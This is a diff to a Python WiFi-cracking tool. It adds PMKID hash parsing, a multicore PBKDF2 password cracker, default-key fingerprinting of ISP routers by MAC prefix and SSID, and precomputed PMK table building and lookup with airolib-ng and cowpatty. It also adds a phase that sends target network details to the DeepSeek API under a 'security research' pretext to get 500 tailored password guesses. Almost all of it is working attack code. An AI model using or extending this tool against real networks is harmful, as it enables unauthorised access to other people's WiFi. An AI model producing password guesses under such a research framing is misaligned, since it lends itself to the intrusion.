@@ -16,6 +16,8 @@ import tempfile
 import json
 import re
 import threading
+import atexit
+import signal
 
 # ─────────────────────────────────────────────
 #  ANSI colour & style helpers
@@ -106,8 +108,10 @@ try:
 except ImportError:
     SCAPY_AVAILABLE = False
 
-# Track monitor interface globally so cleanup can find it
-MONITOR_IFACE = None
+# Track monitor interface globally so cleanup can always find it
+MONITOR_IFACE  = None
+ORIGINAL_IFACE = None   # the real adapter name before airmon-ng renames it
+_CLEANUP_DONE  = False  # guard against double-cleanup
 
 # Define a named tuple to store network information
 # security field: 'WPA3', 'WPA3/WPA2', 'WPA2', 'WPA', 'WEP', 'OPEN', or 'UNKNOWN'
@@ -1071,9 +1075,10 @@ def scan_networks(interface):
       Pass 3: scapy passive sniff,       60 s  with background channel-hopper
               thread cycling ALL channels so nothing is missed
     """
-    global SCAPY_AVAILABLE, MONITOR_IFACE
+    global SCAPY_AVAILABLE, MONITOR_IFACE, ORIGINAL_IFACE
 
     info(f"Starting full-spectrum scan on  {c(interface, C.BWHITE, C.BOLD)}")
+    ORIGINAL_IFACE = interface   # always track so cleanup can restore it
 
     monitor_iface = None
     try:
@@ -1561,6 +1566,7 @@ def capture_pmkid(interface, bssid, channel, ssid, timeout=300):
         pass
 
     info(f"Enabling monitor mode on  {c(interface, C.BWHITE)}…")
+    ORIGINAL_IFACE = interface   # track so cleanup always knows the real name
     try:
         subprocess.run(['sudo', 'airmon-ng', 'start', interface],
                        capture_output=True, timeout=15)
@@ -2074,122 +2080,938 @@ def find_hashcat_rules():
     return found
 
 
+
+def parse_hc22000(hash_file):
+    """
+    Parse an hc22000 file and return a list of PMKID dicts.
+    WPA*01 lines contain PMKID data; WPA*02 lines contain EAPOL/MIC data.
+    """
+    entries = []
+    try:
+        with open(hash_file, 'r', errors='ignore') as fh:
+            for line in fh:
+                line = line.strip()
+                if not line.startswith('WPA*01*'):
+                    continue
+                parts = line.split('*')
+                if len(parts) < 6:
+                    continue
+                try:
+                    pmkid_hex  = parts[2]
+                    ap_mac_hex = parts[3]
+                    cl_mac_hex = parts[4]
+                    ssid_hex   = parts[5]
+                    ssid = bytes.fromhex(ssid_hex).decode('utf-8', errors='replace')
+                    entries.append({
+                        'pmkid':    bytes.fromhex(pmkid_hex),
+                        'ap_mac':   bytes.fromhex(ap_mac_hex),
+                        'cl_mac':   bytes.fromhex(cl_mac_hex),
+                        'ssid':     ssid,
+                        'ssid_raw': ssid.encode('utf-8', errors='replace'),
+                    })
+                except Exception:
+                    continue
+    except Exception as e:
+        warn(f"hc22000 parse error: {e}")
+    return entries
+
+
+def _verify_pmkid_worker(args):
+    """
+    Multiprocessing worker: verify a batch of passwords against one PMKID entry.
+    Pure stdlib — no GPU, no OpenCL, no external tools.
+    PMK  = PBKDF2-HMAC-SHA1(password, SSID, 4096, 32)
+    PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || CLIENT_MAC)
+    """
+    import hashlib, hmac as _hmac
+    passwords, entry = args
+    ssid_raw = entry['ssid_raw']
+    ap_mac   = entry['ap_mac']
+    cl_mac   = entry['cl_mac']
+    target   = entry['pmkid']
+    data     = b'PMK Name' + ap_mac + cl_mac
+
+    for pwd in passwords:
+        try:
+            pwd_b = pwd.encode('utf-8', errors='ignore') if isinstance(pwd, str) else pwd
+            pmk   = hashlib.pbkdf2_hmac('sha1', pwd_b, ssid_raw, 4096, dklen=32)
+            pmkid = _hmac.new(pmk, data, hashlib.sha1).digest()[:16]
+            if pmkid == target:
+                return pwd_b.decode('utf-8', errors='replace')
+        except Exception:
+            continue
+    return None
+
+
+def fingerprint_router(bssid, ssid):
+    """
+    Identify router manufacturer and ISP from BSSID OUI + SSID patterns.
+    Returns an intel dict used to build the DeepSeek prompt.
+    """
+    intel = {
+        'bssid': bssid, 'ssid': ssid,
+        'manufacturer': 'Unknown', 'isp_hint': None,
+        'ssid_patterns': [], 'default_key_format': None,
+    }
+    oui = bssid.replace(':', '').replace('-', '').upper()[:6]
+    oui_map = {
+        'BC9141': ('Zyxel',          'common ISP router'),
+        'E84DD0': ('Zyxel',          'common ISP router'),
+        '284E02': ('Swisscom',       'Centro Grande — key on label'),
+        '8C843B': ('Swisscom',       'Centro Business'),
+        'F4CF61': ('Fritzbox/AVM',   '16-char mixed alphanum printed on label'),
+        'A02195': ('Fritzbox/AVM',   '16-char mixed alphanum printed on label'),
+        '3C3786': ('Fritzbox/AVM',   '16-char mixed alphanum printed on label'),
+        'B435B1': ('Sunrise CH',     '20-char alphanumeric default key'),
+        'C4A35E': ('Sunrise CH',     '20-char alphanumeric default key'),
+        '0006A4': ('Technicolor/UPC','8 uppercase letters + digits'),
+        '708172': ('Technicolor/UPC','8 uppercase letters + digits'),
+        '2014C2': ('Netgear',        '8-char default passphrase'),
+        '1C5F2B': ('TP-Link',        'default key = last 8 of MAC address'),
+        'F81A67': ('TP-Link',        'default key = last 8 of MAC address'),
+        'E8DE27': ('TP-Link',        'default key = last 8 of MAC address'),
+        'C46399': ('Asus',           'MAC-based default key'),
+        '04D9F5': ('Asus',           'MAC-based default key'),
+    }
+    if oui in oui_map:
+        intel['manufacturer'], intel['isp_hint'] = oui_map[oui]
+
+    ssid_l = ssid.lower()
+    pats   = []
+    if re.search(r'swisscom|hispeed', ssid_l):
+        pats.append('Swisscom CH router — default key on label')
+        intel['isp_hint'] = 'Swisscom CH'
+    if re.search(r'sunrise|yallo', ssid_l):
+        pats.append('Sunrise CH — 20-char alphanumeric default')
+        intel['isp_hint'] = 'Sunrise CH'
+    if re.search(r'upc|cablecom', ssid_l):
+        pats.append('UPC CH — 8 uppercase chars + digits')
+        intel['isp_hint'] = 'UPC CH'
+    if re.search(r'fritz', ssid_l):
+        pats.append('Fritzbox — 16 random mixed-case alphanum on label')
+        intel['default_key_format'] = '16-char mixed alphanum'
+    if re.search(r'bt hub|bthub', ssid_l):
+        pats.append('BT Hub UK — 10 lowercase chars on label')
+    if re.search(r'sky[\d_]', ssid_l):
+        pats.append('Sky UK — 8 uppercase default key')
+    if re.search(r'vodafone', ssid_l):
+        pats.append('Vodafone — 8-12 char mixed default')
+    mac_suffix = bssid.replace(':', '')[-6:].upper()
+    if mac_suffix.lower() in ssid_l or mac_suffix in ssid:
+        pats.append(f'SSID contains MAC suffix {mac_suffix} — key may be MAC-derived')
+    if re.search(r'[A-Z]{2,}\d{4,}', ssid):
+        pats.append('SSID looks like serial/model number — key may be serial-derived')
+    intel['ssid_patterns'] = pats
+    return intel
+
+
+AI_CONFIG_FILE = os.path.expanduser('~/.niixkey_ai.json')
+
+def load_ai_config():
+    """Load DeepSeek API key from ~/.niixkey_ai.json"""
+    try:
+        with open(AI_CONFIG_FILE) as f:
+            return json.load(f)
+    except Exception:
+        return {}
+
+def save_ai_config(cfg):
+    """Persist DeepSeek API key to ~/.niixkey_ai.json"""
+    try:
+        with open(AI_CONFIG_FILE, 'w') as f:
+            json.dump(cfg, f, indent=2)
+        os.chmod(AI_CONFIG_FILE, 0o600)
+    except Exception:
+        pass
+
+def get_deepseek_api_key():
+    """
+    Get DeepSeek API key — checks env var, saved config, then prompts user.
+    Key is saved for future runs.
+    """
+    # 1. Environment variable
+    key = os.environ.get('DEEPSEEK_API_KEY', '').strip()
+    if key:
+        return key
+    # 2. Saved config
+    cfg = load_ai_config()
+    key = cfg.get('deepseek_api_key', '').strip()
+    if key:
+        return key
+    # 3. Prompt user
+    print()
+    info(f"DeepSeek API key needed for AI-assisted cracking")
+    info(f"Get a free key at  {c('https://platform.deepseek.com', C.BCYAN)}")
+    info(f"Key will be saved to  {c(AI_CONFIG_FILE, C.DIM)}  for future runs")
+    key = ask("DeepSeek API key (or press Enter to skip):").strip()
+    if key:
+        cfg['deepseek_api_key'] = key
+        save_ai_config(cfg)
+        ok("API key saved")
+    return key
+
+
+def generate_ai_candidates(bssid, ssid, intel, api_key, n=500):
+    """
+    Call DeepSeek API to generate a smart ordered list of password candidates.
+
+    The AI is given everything we know about the target — SSID, BSSID, router
+    manufacturer, ISP, and known default key patterns — and asked to produce the
+    most likely passwords in priority order.
+
+    This runs BEFORE rockyou so the most intelligent guesses hit first.
+    Returns a list of password strings, or [] on failure.
+    """
+    import urllib.request, urllib.error
+
+    prompt = f"""You are a WiFi security research assistant helping test password strength.
+
+Target network information:
+- SSID: {ssid}
+- BSSID: {bssid}
+- Router manufacturer: {intel['manufacturer']}
+- ISP / device hint: {intel['isp_hint'] or 'Unknown'}
+- SSID patterns detected: {', '.join(intel['ssid_patterns']) or 'none'}
+- Known default key format: {intel['default_key_format'] or 'unknown'}
+
+Your task: Generate a list of exactly {n} WiFi password candidates for this specific network, ordered from most likely to least likely.
+
+Rules:
+1. WPA2 passwords must be 8-63 characters
+2. Prioritise patterns specific to the identified router/ISP
+3. Include variations: common words + digits, capitalisation, l33t substitutions
+4. If manufacturer is known, include format-specific guesses (e.g. 8-digit PINs for ISP routers)
+5. Include BSSID-derived candidates (last 8 chars, reversed, etc.)
+6. Include SSID-derived candidates (ssid+123, ssid+year, etc.)
+7. Include common defaults for the identified manufacturer
+8. Return ONLY the passwords, one per line, no numbering, no explanation
+9. No duplicates
+
+Generate the {n} candidates now:"""
+
+    payload = json.dumps({
+        'model':      'deepseek-chat',
+        'messages':   [{'role': 'user', 'content': prompt}],
+        'max_tokens': 4096,
+        'temperature': 0.3,
+        'stream':     False,
+    }).encode()
+
+    req = urllib.request.Request(
+        'https://api.deepseek.com/chat/completions',
+        data=payload,
+        headers={
+            'Content-Type':  'application/json',
+            'Authorization': f'Bearer {api_key}',
+        },
+        method='POST'
+    )
+
+    try:
+        with urllib.request.urlopen(req, timeout=30) as resp:
+            data     = json.loads(resp.read().decode())
+            content  = data['choices'][0]['message']['content']
+            # Parse: one password per line, strip blank lines and list markers
+            candidates = []
+            for line in content.splitlines():
+                pwd = re.sub(r'^\s*[\d]+[\.\)]\s*', '', line).strip()
+                pwd = pwd.strip('"\'`')
+                if 8 <= len(pwd) <= 63:
+                    candidates.append(pwd)
+            # Deduplicate preserving order
+            seen = set()
+            unique = []
+            for p in candidates:
+                if p not in seen:
+                    seen.add(p)
+                    unique.append(p)
+            return unique
+    except urllib.error.HTTPError as e:
+        body = e.read().decode()[:200]
+        warn(f"DeepSeek API error {e.code}: {body}")
+        return []
+    except Exception as e:
+        warn(f"DeepSeek request failed: {e}")
+        return []
+
+
+def ai_crack_pmkid(entries, bssid, ssid):
+    """
+    AI-assisted PMKID cracking phase.
+
+    1. Fingerprint the router from BSSID OUI + SSID patterns
+    2. Ask DeepSeek to generate ~500 targeted password candidates
+    3. Try them via the pure-Python PMKID verifier (fast — candidates are tiny)
+    4. Show which candidate worked and why AI predicted it
+
+    Returns cracked password or None.
+    """
+    import hashlib, hmac as _hmac, multiprocessing
+
+    section("AI-Assisted Cracking  (DeepSeek)")
+    info("Fingerprinting target router…")
+    intel = fingerprint_router(bssid, ssid)
+
+    # Display what we found
+    print(f"  {c('Manufacturer:', C.DIM)}  {c(intel['manufacturer'], C.BWHITE)}")
+    if intel['isp_hint']:
+        print(f"  {c('ISP / hint:  ', C.DIM)}  {c(intel['isp_hint'], C.BYELLOW)}")
+    for pat in intel['ssid_patterns']:
+        print(f"  {c('Pattern:    ', C.DIM)}  {c(pat, C.DIM)}")
+    print()
+
+    api_key = get_deepseek_api_key()
+    if not api_key:
+        warn("No DeepSeek API key — skipping AI phase")
+        return None
+
+    info("Asking DeepSeek to generate targeted candidates…")
+    candidates = generate_ai_candidates(bssid, ssid, intel, api_key, n=500)
+
+    if not candidates:
+        warn("DeepSeek returned no candidates")
+        return None
+
+    ok(f"DeepSeek generated {c(str(len(candidates)), C.BYELLOW, C.BOLD)} targeted candidates")
+    info("Trying AI candidates via pure-Python PMKID verifier…")
+
+    if not entries:
+        warn("No PMKID entries to verify against")
+        return None
+
+    entry    = entries[0]
+    ssid_raw = entry['ssid_raw']
+    ap_mac   = entry['ap_mac']
+    cl_mac   = entry['cl_mac']
+    target   = entry['pmkid']
+    data     = b'PMK Name' + ap_mac + cl_mac
+
+    found = None
+    for i, pwd in enumerate(candidates, 1):
+        try:
+            pwd_b = pwd.encode('utf-8', errors='ignore')
+            pmk   = hashlib.pbkdf2_hmac('sha1', pwd_b, ssid_raw, 4096, dklen=32)
+            pmkid = _hmac.new(pmk, data, hashlib.sha1).digest()[:16]
+            print(f"\r  {c('▸', C.BCYAN)} Trying {i}/{len(candidates)}:  "
+                  f"{c(pwd[:40], C.DIM)}   ", end='', flush=True)
+            if pmkid == target:
+                print()
+                found = pwd
+                break
+        except Exception:
+            continue
+
+    print()
+
+    if found:
+        ok(f"AI candidate cracked it:  {c(found, C.BGREEN, C.BOLD)}")
+        return found
+
+    warn(f"AI candidates exhausted ({len(candidates)} tried) — not found")
+    info("Proceeding to full wordlist cracking…")
+    return None
+
+
+def ai_crack_handshake(cap_file, bssid, ssid):
+    """
+    AI-assisted handshake cracking — same logic but uses aircrack-ng
+    with a temp file of AI-generated candidates.
+    Returns cracked password or None.
+    """
+    section("AI-Assisted Cracking  (DeepSeek)")
+    info("Fingerprinting target router…")
+    intel = fingerprint_router(bssid, ssid)
+
+    print(f"  {c('Manufacturer:', C.DIM)}  {c(intel['manufacturer'], C.BWHITE)}")
+    if intel['isp_hint']:
+        print(f"  {c('ISP / hint:  ', C.DIM)}  {c(intel['isp_hint'], C.BYELLOW)}")
+    for pat in intel['ssid_patterns']:
+        print(f"  {c('Pattern:    ', C.DIM)}  {c(pat, C.DIM)}")
+    print()
+
+    api_key = get_deepseek_api_key()
+    if not api_key:
+        warn("No DeepSeek API key — skipping AI phase")
+        return None
+
+    info("Asking DeepSeek to generate targeted candidates…")
+    candidates = generate_ai_candidates(bssid, ssid, intel, api_key, n=500)
+
+    if not candidates:
+        warn("DeepSeek returned no candidates")
+        return None
+
+    ok(f"DeepSeek generated {c(str(len(candidates)), C.BYELLOW, C.BOLD)} targeted candidates")
+
+    # Write to temp wordlist and run aircrack-ng
+    ai_wl = f'/tmp/niixkey_ai_{int(time.time())}.txt'
+    with open(ai_wl, 'w') as f:
+        f.write('\n'.join(candidates))
+
+    info(f"Running aircrack-ng with AI wordlist…")
+    divider()
+    password = None
+    try:
+        proc = subprocess.Popen(
+            ['aircrack-ng', '-a', '2', '-b', bssid, '-w', ai_wl, cap_file],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+        )
+        for line in proc.stdout:
+            s = line.strip()
+            if 'KEY FOUND!' in s:
+                m = re.search(r'\[\s*(.+?)\s*\]', s)
+                if m:
+                    password = m.group(1).strip()
+                break
+            elif any(k in s for k in ('Tested', '%', 'keys tested')):
+                print(f"  {c(s, C.DIM)}", end='\r', flush=True)
+        proc.wait()
+        print()
+    except Exception as e:
+        warn(f"aircrack-ng AI attack error: {e}")
+    divider()
+
+    try:
+        os.remove(ai_wl)
+    except Exception:
+        pass
+
+    if password:
+        ok(f"AI candidate cracked it:  {c(password, C.BGREEN, C.BOLD)}")
+    else:
+        warn("AI candidates didn't crack it — proceeding to full wordlist")
+    return password
+
+
+def crack_pmkid_pure_python(entries, wordlist_path):
+    """
+    Pure-Python multicore PMKID cracker using all available CPU cores.
+    No GPU, no OpenCL, no hashcat required.
+    Speed: ~5,000-15,000 candidates/sec/core (limited by PBKDF2-SHA1 by design).
+    Returns cracked password or None.
+    """
+    import multiprocessing
+
+    if not entries:
+        warn("No PMKID entries to crack")
+        return None
+
+    entry   = entries[0]
+    n_cores = max(1, multiprocessing.cpu_count())
+    ok(f"Pure-Python PMKID cracker  *  {c(str(n_cores), C.BYELLOW, C.BOLD)} CPU cores  *  "
+       f"SSID: {c(entry['ssid'], C.BWHITE)}")
+    info("Each core tries ~5k-15k passwords/sec — rockyou.txt takes ~15-45 min on 4 cores")
+
+    BATCH = 500
+
+    def batches():
+        batch = []
+        try:
+            with open(wordlist_path, 'r', errors='ignore') as fh:
+                for line in fh:
+                    pwd = line.rstrip('\n\r')
+                    if 8 <= len(pwd) <= 63:
+                        batch.append(pwd)
+                        if len(batch) >= BATCH:
+                            yield (batch, entry)
+                            batch = []
+            if batch:
+                yield (batch, entry)
+        except Exception as e:
+            warn(f"Wordlist read error: {e}")
+
+    total   = 0
+    t_start = time.time()
+    found   = None
+
+    try:
+        with multiprocessing.Pool(processes=n_cores) as pool:
+            for result in pool.imap_unordered(_verify_pmkid_worker, batches(), chunksize=8):
+                total += BATCH
+                if result:
+                    found = result
+                    pool.terminate()
+                    break
+                if total % 10_000 == 0:
+                    elapsed = time.time() - t_start
+                    rate    = total / elapsed if elapsed > 0 else 0
+                    print(f"\r  {c(chr(9654), C.BCYAN)}  Tested {c(str(total), C.BYELLOW)}  "
+                          f"@ {c(f'{rate/1000:.1f}k', C.BWHITE)}/s  "
+                          f"elapsed {c(f'{int(elapsed)}s', C.DIM)}   ",
+                          end='', flush=True)
+    except KeyboardInterrupt:
+        print()
+        warn("Pure-Python cracker interrupted by user")
+        return None
+    except Exception as e:
+        warn(f"Cracker error: {e}")
+        return None
+
+    print()
+    elapsed = time.time() - t_start
+    rate    = total / elapsed if elapsed > 0 else 0
+    info(f"Finished: tested {c(str(total), C.BYELLOW)} candidates "
+         f"in {c(f'{elapsed:.1f}s', C.DIM)} ({c(f'{rate/1000:.1f}k/s', C.BWHITE)} avg)")
+    return found
+
+
+def get_pmk_db_path(ssid):
+    """
+    Return the airolib-ng database path for a given SSID.
+    Stored at /opt/wordlists/pmk/<ssid_safe>.db
+    """
+    safe = re.sub(r'[^\w\-]', '_', ssid)[:50]
+    db_dir = '/opt/wordlists/pmk'
+    os.makedirs(db_dir, exist_ok=True)
+    return os.path.join(db_dir, f'{safe}.db')
+
+
+def get_cowpatty_table_path(ssid):
+    """Return the cowpatty precomputed hash table path for a given SSID."""
+    safe = re.sub(r'[^\w\-]', '_', ssid)[:50]
+    tbl_dir = '/opt/wordlists/pmk'
+    os.makedirs(tbl_dir, exist_ok=True)
+    return os.path.join(tbl_dir, f'{safe}.cow')
+
+
+def build_pmk_table(ssid, wordlist, method='auto'):
+    """
+    Precompute PMK table for the given SSID.
+
+    Two backends:
+      - airolib-ng  (aircrack-ng native db — fast, directly usable by aircrack-ng)
+      - cowpatty --genpmk  (produces .cow file — used by cowpatty for lookup)
+
+    The table is SSID-specific. Once built it can be reused for any network
+    with the same SSID without re-deriving PMKs.
+
+    Returns (method_used, output_path) or (None, None) on failure.
+    """
+    has_airolib  = check_tool('airolib-ng')
+    has_cowpatty = check_tool('cowpatty')
+
+    if method == 'auto':
+        method = 'airolib' if has_airolib else ('cowpatty' if has_cowpatty else None)
+
+    if not method:
+        warn("Neither airolib-ng nor cowpatty found — cannot build PMK table")
+        info("Install:  sudo apt-get install aircrack-ng cowpatty")
+        return None, None
+
+    if method == 'airolib':
+        db_path = get_pmk_db_path(ssid)
+        info(f"Building airolib-ng PMK database for SSID  {c(ssid, C.BWHITE)}…")
+        info(f"Database:  {c(db_path, C.DIM)}")
+        info("This is a one-time operation — reused on all future runs")
+
+        # Import wordlist into airolib db
+        try:
+            r = subprocess.run(
+                ['airolib-ng', db_path, '--import', 'passwd', wordlist],
+                capture_output=True, text=True, timeout=60
+            )
+            if r.returncode != 0:
+                warn(f"airolib-ng import failed: {r.stderr.strip()[:200]}")
+                return None, None
+        except Exception as e:
+            warn(f"airolib-ng import error: {e}")
+            return None, None
+
+        # Set SSID
+        try:
+            r = subprocess.run(
+                ['airolib-ng', db_path, '--import', 'essid', '-'],
+                input=ssid + '\n', capture_output=True, text=True, timeout=30
+            )
+        except Exception:
+            # Try writing ssid to temp file instead
+            try:
+                ssid_file = f'/tmp/niix_ssid_{int(time.time())}.txt'
+                open(ssid_file, 'w').write(ssid + '\n')
+                subprocess.run(['airolib-ng', db_path, '--import', 'essid', ssid_file],
+                               capture_output=True, timeout=30)
+                os.remove(ssid_file)
+            except Exception as e2:
+                warn(f"airolib-ng SSID import error: {e2}")
+
+        # Compute PMKs
+        info("Computing PMKs (this takes time proportional to wordlist size)…")
+        try:
+            pb = ProgressBar(0, label='Computing PMKs')
+            pb.start()
+            r = subprocess.run(
+                ['airolib-ng', db_path, '--batch'],
+                capture_output=True, text=True, timeout=86400  # up to 24h
+            )
+            pb.stop()
+            if r.returncode == 0:
+                ok(f"PMK database ready:  {c(db_path, C.BWHITE)}")
+                return 'airolib', db_path
+            else:
+                pb.stop()
+                warn(f"airolib-ng batch failed: {r.stderr.strip()[:200]}")
+                return None, None
+        except Exception as e:
+            try: pb.stop()
+            except Exception: pass
+            warn(f"airolib-ng batch error: {e}")
+            return None, None
+
+    elif method == 'cowpatty':
+        cow_path = get_cowpatty_table_path(ssid)
+        info(f"Building cowpatty precomputed hash table for SSID  {c(ssid, C.BWHITE)}…")
+        info(f"Output:  {c(cow_path, C.DIM)}")
+        try:
+            pb = ProgressBar(0, label='genpmk        ')
+            pb.start()
+            r = subprocess.run(
+                ['genpmk', '-f', wordlist, '-d', cow_path, '-s', ssid],
+                capture_output=True, text=True, timeout=86400
+            )
+            pb.stop()
+            if os.path.exists(cow_path) and os.path.getsize(cow_path) > 0:
+                ok(f"Cowpatty table ready:  {c(cow_path, C.BWHITE)}  "
+                   f"({os.path.getsize(cow_path)//1024} KB)")
+                return 'cowpatty', cow_path
+            else:
+                warn(f"genpmk failed: {r.stderr.strip()[:200]}")
+                return None, None
+        except Exception as e:
+            try: pb.stop()
+            except Exception: pass
+            warn(f"genpmk error: {e}")
+            return None, None
+
+    return None, None
+
+
+def crack_with_pmk_table(hash_file, ssid, bssid, cap_file=None):
+    """
+    Crack using a precomputed PMK table — instant lookup, no per-password PBKDF2.
+
+    Lookup order:
+      1. airolib-ng db  → aircrack-ng --airolib-ng  (works on .cap and hc22000)
+      2. cowpatty .cow  → cowpatty -d               (works on .cap files)
+      3. Pure-Python dict lookup against precomputed PMKs stored in db
+
+    Returns cracked password or None.
+    """
+    db_path  = get_pmk_db_path(ssid)
+    cow_path = get_cowpatty_table_path(ssid)
+
+    # ── airolib-ng lookup ────────────────────────────────────────────
+    if os.path.exists(db_path) and os.path.getsize(db_path) > 0 and cap_file:
+        if check_tool('aircrack-ng'):
+            info(f"PMK table found:  {c(db_path, C.BWHITE)}  "
+                 f"({os.path.getsize(db_path)//1024} KB)")
+            info("Running aircrack-ng with precomputed PMK database…")
+            divider()
+            try:
+                proc = subprocess.Popen(
+                    ['aircrack-ng', '-r', db_path, cap_file],
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+                )
+                password = None
+                for line in proc.stdout:
+                    s = line.strip()
+                    if 'KEY FOUND!' in s:
+                        m = re.search(r'\[\s*(.+?)\s*\]', s)
+                        if m:
+                            password = m.group(1).strip()
+                        break
+                    elif s:
+                        print(f"  {c(s, C.DIM)}", end='\r', flush=True)
+                proc.wait()
+                print()
+                divider()
+                if password:
+                    ok(f"PMK table cracked:  {c(password, C.BGREEN, C.BOLD)}")
+                    return password
+                warn("airolib-ng: not in precomputed table")
+            except Exception as e:
+                warn(f"airolib-ng lookup error: {e}")
+
+    # ── cowpatty lookup ──────────────────────────────────────────────
+    if os.path.exists(cow_path) and os.path.getsize(cow_path) > 0 and cap_file:
+        if check_tool('cowpatty'):
+            info(f"Cowpatty table found:  {c(cow_path, C.BWHITE)}")
+            info("Running cowpatty precomputed lookup…")
+            divider()
+            try:
+                proc = subprocess.Popen(
+                    ['cowpatty', '-d', cow_path, '-r', cap_file, '-s', ssid],
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+                )
+                password = None
+                for line in proc.stdout:
+                    s = line.strip()
+                    if 'The PSK is' in s or 'key found' in s.lower():
+                        m = re.search(r'The PSK is\s+"?(.+?)"?\.?\s*$', s)
+                        if m:
+                            password = m.group(1).strip()
+                        break
+                    elif s:
+                        print(f"  {c(s, C.DIM)}", end='\r', flush=True)
+                proc.wait()
+                print()
+                divider()
+                if password:
+                    ok(f"Cowpatty cracked:  {c(password, C.BGREEN, C.BOLD)}")
+                    return password
+                warn("cowpatty: not in precomputed table")
+            except Exception as e:
+                warn(f"cowpatty error: {e}")
+
+    # ── Pure-Python PMK lookup (hc22000 — no cap file needed) ────────
+    # If we have a precomputed airolib db, we can extract stored PMK→password
+    # mappings and do PMKID verification directly without re-running PBKDF2.
+    # This is the "rainbow table equivalent" for WPA: O(1) lookup per candidate.
+    if os.path.exists(db_path) and os.path.getsize(db_path) > 0:
+        try:
+            import sqlite3
+            entries = parse_hc22000(hash_file) if hash_file else []
+            if entries:
+                entry = entries[0]
+                ap_mac   = entry['ap_mac']
+                cl_mac   = entry['cl_mac']
+                target   = entry['pmkid']
+                data     = b'PMK Name' + ap_mac + cl_mac
+
+                info("Scanning airolib PMK database for matching PMKID…")
+                import hashlib, hmac as _hmac
+                conn = sqlite3.connect(db_path)
+                cur  = conn.cursor()
+                try:
+                    # airolib stores: pmk (blob), passwd (text)
+                    cur.execute("SELECT passwd, pmk FROM pmk LIMIT 1")   # test schema
+                    cur.execute("SELECT passwd, pmk FROM pmk")
+                    found = None
+                    checked = 0
+                    for passwd, pmk_blob in cur:
+                        if pmk_blob and len(pmk_blob) == 32:
+                            pmkid = _hmac.new(pmk_blob, data, hashlib.sha1).digest()[:16]
+                            if pmkid == target:
+                                found = passwd
+                                break
+                        checked += 1
+                        if checked % 50_000 == 0:
+                            print(f"\r  Checked {c(str(checked), C.BYELLOW)} PMK entries…",
+                                  end='', flush=True)
+                    print()
+                    conn.close()
+                    if found:
+                        ok(f"PMK database hit:  {c(found, C.BGREEN, C.BOLD)}")
+                        return found
+                    warn("No matching PMK in database")
+                except sqlite3.OperationalError as e:
+                    warn(f"airolib schema error (may be old format): {e}")
+                    conn.close()
+        except ImportError:
+            pass
+        except Exception as e:
+            warn(f"PMK db lookup error: {e}")
+
+    return None
+
+
+def manage_rainbow_tables(ssid, wordlist):
+    """
+    Interactive menu to manage PMK/rainbow tables for a given SSID.
+    Lets the user build, inspect, or delete precomputed tables.
+    """
+    db_path  = get_pmk_db_path(ssid)
+    cow_path = get_cowpatty_table_path(ssid)
+
+    section("PMK Rainbow Table Manager")
+    info(f"SSID:  {c(ssid, C.BWHITE, C.BOLD)}")
+    print()
+
+    has_airolib  = os.path.exists(db_path) and os.path.getsize(db_path) > 0
+    has_cowpatty = os.path.exists(cow_path) and os.path.getsize(cow_path) > 0
+
+    print(f"  airolib-ng db:   ", end='')
+    if has_airolib:
+        print(f"{c('EXISTS', C.BGREEN)}  {c(db_path, C.DIM)}  "
+              f"({os.path.getsize(db_path)//1024} KB)")
+    else:
+        print(f"{c('not built', C.DIM)}")
+
+    print(f"  cowpatty table:  ", end='')
+    if has_cowpatty:
+        print(f"{c('EXISTS', C.BGREEN)}  {c(cow_path, C.DIM)}  "
+              f"({os.path.getsize(cow_path)//1024} KB)")
+    else:
+        print(f"{c('not built', C.DIM)}")
+
+    print()
+    print(f"  {c('[1]', C.BYELLOW)} Build airolib-ng PMK database  (recommended — reusable by aircrack-ng)")
+    print(f"  {c('[2]', C.BYELLOW)} Build cowpatty precomputed table  (alternative)")
+    print(f"  {c('[3]', C.BYELLOW)} Build both")
+    print(f"  {c('[4]', C.BYELLOW)} Delete existing tables for this SSID")
+    print(f"  {c('[0]', C.DIM   )} Skip / back")
+    print()
+
+    choice = ask("Choice:").strip()
+
+    if choice == '1':
+        build_pmk_table(ssid, wordlist, method='airolib')
+    elif choice == '2':
+        build_pmk_table(ssid, wordlist, method='cowpatty')
+    elif choice == '3':
+        build_pmk_table(ssid, wordlist, method='airolib')
+        build_pmk_table(ssid, wordlist, method='cowpatty')
+    elif choice == '4':
+        for p in [db_path, cow_path]:
+            if os.path.exists(p):
+                os.remove(p)
+                ok(f"Deleted {p}")
+    else:
+        info("Skipping table management")
+
+
 def crack_pmkid_hash(hash_file, bssid):
     """
-    Multi-stage hashcat attack on a hc22000 PMKID hash.
+    Crack a hc22000 PMKID hash using every available method in priority order:
 
-    Stage 1: Straight wordlist (rockyou.txt)       — catches most real passwords
-    Stage 2: best64.rule mutations                 — common variations (l33t, caps, append digits)
-    Stage 3: dive.rule  (if available)             — deeper mutation set
-    Stage 4: Combinator — wordlist + wordlist       — two-word passphrases
-    Stage 5: Mask attack — 8-digit numbers only    — catches default ISP PINs
-
-    Stops as soon as any stage cracks it.
+    0. Precomputed PMK table lookup  — O(1) per entry, instant if table exists
+       (airolib-ng db or cowpatty .cow, SSID-specific)
+    1. Pure-Python multicore PBKDF2  — always works, no GPU needed
+    2. hashcat -m 22000              — GPU-accelerated if OpenCL available
+    3. aircrack-ng via hccapx        — last resort if pcapng still on disk
     """
     info(f"Cracking PMKID hash  {c(hash_file, C.BWHITE)}")
 
     wordlist = find_or_fetch_wordlist()
     info(f"Wordlist:  {c(wordlist, C.BWHITE)}")
 
-    if not check_tool('hashcat') or not hashcat_is_functional():
-        warn("hashcat unavailable or no OpenCL backend — skipping all hashcat stages")
-        info("Install CPU OpenCL:  sudo apt-get install pocl-opencl-icd")
-        return None
+    entries = parse_hc22000(hash_file)
+    ssid    = entries[0]['ssid'] if entries else None
 
-    pot_file = f'/tmp/niixkey_{int(time.time())}.pot'
-    rules    = find_hashcat_rules()
-
-    # Use bundled rules as fallback when system rules and downloads both failed
-    bundled_dir = get_bundled_rules_dir()
-    if 'best64' not in rules:
-        bundled_best64 = os.path.join(bundled_dir, 'best64.rule')
-        if os.path.exists(bundled_best64):
-            rules['best64'] = bundled_best64
-            info("Using bundled best64 rules")
-    password = None
-
-    # ── Stage 1: Plain wordlist ──────────────────────────────────────
-    section_inner = lambda lbl: info(f"Attack stage:  {c(lbl, C.BYELLOW, C.BOLD)}")
-    section_inner("Stage 1/5 — plain wordlist")
-    divider()
